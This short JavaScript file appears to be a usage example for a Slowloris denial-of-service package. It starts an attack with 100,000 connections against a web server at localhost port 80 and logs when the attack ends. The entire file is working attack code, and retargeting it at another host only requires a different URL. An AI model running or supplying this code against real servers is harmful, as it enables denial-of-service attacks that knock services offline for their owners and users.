const Loris = require("@anzerr/slowloris.tool");

let l = new Loris("http://127.0.0.1:80", 100000).attack();

return new Promise((resolve) => l.once("end", resolve))
  .then(() => {
    console.log("attack ended");
  })
  .catch(console.log);
